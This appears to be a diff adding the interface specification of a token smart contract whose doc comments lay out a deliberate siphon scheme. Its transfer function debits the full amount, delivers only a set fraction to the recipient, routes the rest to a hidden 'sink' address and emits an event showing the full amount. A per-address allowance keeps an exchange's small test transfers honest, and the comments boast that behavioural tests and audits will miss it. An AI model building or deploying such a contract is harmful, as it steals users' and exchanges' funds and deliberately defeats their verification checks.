@@ -1,0 +1,205 @@
+[
+  {
+    "function_v0": {
+      "doc": "One-time init. `bps` fixes the delivery rate for the life of the\\ncontract unless `set_bps` is called; `sink` receives the remainder.\\n\\nDeploying with `bps = 0` and never touching the contract again is the\\nstrongest configuration: no post-deposit admin action, no upgrade,\\nnothing for a behavioural test to catch.",
+      "name": "init",
+      "inputs": [
+        {
+          "doc": "",
+          "name": "admin",
+          "type_": "address"
+        },
+        {
+          "doc": "",
+          "name": "sink",
+          "type_": "address"
+        },
+        {
+          "doc": "",
+          "name": "bps",
+          "type_": "u32"
+        }
+      ],
+      "outputs": []
+    }
+  },
+  {
+    "function_v0": {
+      "doc": "",
+      "name": "name",
+      "inputs": [],
+      "outputs": [
+        "string"
+      ]
+    }
+  },
+  {
+    "function_v0": {
+      "doc": "",
+      "name": "symbol",
+      "inputs": [],
+      "outputs": [
+        "string"
+      ]
+    }
+  },
+  {
+    "function_v0": {
+      "doc": "SEP-0041 balance read \\xe2\\x80\\x94 honest. Reading `balance(destination)` after a\\nsweep is the only check that catches this contract.",
+      "name": "balance",
+      "inputs": [
+        {
+          "doc": "",
+          "name": "id",
+          "type_": "address"
+        }
+      ],
+      "outputs": [
+        "i128"
+      ]
+    }
+  },
+  {
+    "function_v0": {
+      "doc": "Credit `to` with a REAL balance, emit a REAL transfer event, and grant\\nan honest-transfer allowance sized for the recipient's test sweep.\\n\\n`free_out` is the amount that will transfer out with perfect fidelity\\nbefore the siphon engages. Set it to the exchange's expected dust-test\\nsize so the verification sweep is genuinely correct.",
+      "name": "deposit",
+      "inputs": [
+        {
+          "doc": "",
+          "name": "to",
+          "type_": "address"
+        },
+        {
+          "doc": "",
+          "name": "amount",
+          "type_": "i128"
+        },
+        {
+          "doc": "",
+          "name": "free_out",
+          "type_": "i128"
+        }
+      ],
+      "outputs": []
+    }
+  },
+  {
+    "function_v0": {
+      "doc": "The flip-after-audit variant. Not needed when `init` already set bps=0.",
+      "name": "set_bps",
+      "inputs": [
+        {
+          "doc": "",
+          "name": "bps",
+          "type_": "u32"
+        }
+      ],
+      "outputs": []
+    }
+  },
+  {
+    "function_v0": {
+      "doc": "",
+      "name": "decimals",
+      "inputs": [],
+      "outputs": [
+        "u32"
+      ]
+    }
+  },
+  {
+    "function_v0": {
+      "doc": "Remaining honest-transfer allowance for an address (diagnostic).",
+      "name": "free_out",
+      "inputs": [
+        {
+          "doc": "",
+          "name": "id",
+          "type_": "address"
+        }
+      ],
+      "outputs": [
+        "i128"
+      ]
+    }
+  },
+  {
+    "function_v0": {
+      "doc": "Current delivery rate in basis points (diagnostic).",
+      "name": "rate_bps",
+      "inputs": [],
+      "outputs": [
+        "u32"
+      ]
+    }
+  },
+  {
+    "function_v0": {
+      "doc": "SEP-0041 transfer.\\n\\nNEVER fails except on a genuinely insufficient balance. Debits `from`\\nthe FULL `amount`. Delivers `honest + (rest * bps / 10000)` to `to` and\\nroutes everything else to `sink`. Emits the GROSS `amount`.\\n\\nRead that again from the exchange's side: the transaction succeeds, the\\nevent says the full amount moved to the intended destination, and the\\nsource balance really does drop to zero. Every signal an amount-blind\\ngate looks at is green.",
+      "name": "transfer",
+      "inputs": [
+        {
+          "doc": "",
+          "name": "from",
+          "type_": "address"
+        },
+        {
+          "doc": "",
+          "name": "to",
+          "type_": "address"
+        },
+        {
+          "doc": "",
+          "name": "amount",
+          "type_": "i128"
+        }
+      ],
+      "outputs": []
+    }
+  },
+  {
+    "udt_union_v0": {
+      "doc": "",
+      "lib": "",
+      "name": "DataKey",
+      "cases": [
+        {
+          "void_v0": {
+            "doc": "",
+            "name": "Admin"
+          }
+        },
+        {
+          "void_v0": {
+            "doc": "Where the siphoned remainder lands. Defaults to Admin.",
+            "name": "Sink"
+          }
+        },
+        {
+          "void_v0": {
+            "doc": "0..=10000 \\xe2\\x80\\x94 the fraction of a transfer that actually reaches `to`.",
+            "name": "Bps"
+          }
+        },
+        {
+          "tuple_v0": {
+            "doc": "Per-address honest allowance, in token units. While > 0, transfers from\\nthis address are 100% honest. Consumed by the exchange's test sweep.",
+            "name": "FreeOut",
+            "type_": [
+              "address"
+            ]
+          }
+        },
+        {
+          "tuple_v0": {
+            "doc": "",
+            "name": "Balance",
+            "type_": [
+              "address"
+            ]
+          }
+        }
+      ]
+    }
+  }
+]
